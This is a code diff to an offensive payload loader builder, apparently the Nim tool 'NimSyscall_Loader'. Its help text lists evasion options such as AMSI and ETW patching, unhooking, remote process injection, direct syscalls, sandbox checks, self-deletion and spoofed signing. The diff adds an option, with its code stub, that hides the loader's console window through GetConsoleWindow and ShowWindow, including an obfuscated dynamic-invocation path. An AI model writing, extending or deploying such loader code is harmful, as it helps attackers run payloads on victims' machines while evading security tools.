@@ -57,7 +57,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -76,6 +76,7 @@ Options:
   --noAMSI    Don't patch AMSI
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
   --hide    Compile with --app:gui flag, so that the console won't pop up
+  --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --debug    Compiles the binary in debug mode (More DInvoke output)
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
@@ -165,6 +166,7 @@ var
     sleeptime: int = 0
     reflective: bool = false
     hide: bool = false
+    apiHide: bool = false
     noArgs: bool = false
     peinject: bool = false
     peload: bool = false
@@ -294,6 +296,10 @@ if args["--sleepycrypt"]:
 
 if args["--hide"]:
   hide = true
+
+if args["--APIhide"]:
+  apihide = true
+  hide = false
 
 if args["--noArgs"]:
   noArgs = true
@@ -829,6 +835,39 @@ proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BO
     return true
 """
 
+let APIHideStub = """
+
+#[ Crappy behaviours here , maybe I'll fix it later ]
+when defined(DInvoke):
+    const
+      USER32_DLL* = obf("user32.dll")
+
+    type
+      GetConsoleWindow_t* = proc (): HANDLE {.stdcall.}
+      ShowWindow_t* = proc (hwnd: HANDLE, nCmdShow: int): BOOL {.stdcall.}
+  
+    const
+      GetConsoleWindow_OBF * = obf("GetConsoleWindow")
+      ShowWindow_OBF * = obf("ShowWindow")
+  
+    var MyGetConsoleWindow*: GetConsoleWindow_t
+    var MyShowWindow*: ShowWindow_t
+
+    MyGetConsoleWindow = cast[GetConsoleWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetConsoleWindow_OBF, 0, FALSE)))
+
+    MyShowWindow = cast[ShowWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(USER32_DLL, TRUE)), ShowWindow_OBF, 0, FALSE)))
+
+
+    var hwnd: HANDLE = MyGetConsoleWindow()
+    var hidden: bool = MyShowWindow(hwnd, SW_HIDE)
+    echo "Hidden:", hidden
+
+else:]#
+var hwnd: HANDLE
+hwnd = GetConsoleWindow()
+ShowWindow(hwnd, SW_HIDE)
+"""
+
 let SleepyCryptLoopExecute = """
 SleepyCryptLoop(10000)
 """
@@ -860,6 +899,9 @@ if(sandbox):
             stub.add(DomainJoinStub)
         if (m == "MemorySpace"):
             stub.add(MemorySpaceStub)
+
+if (apihide):
+    stub.add(APIHideStub)
 
 if(gosleep):
     stub.add(SleepStubFirst)
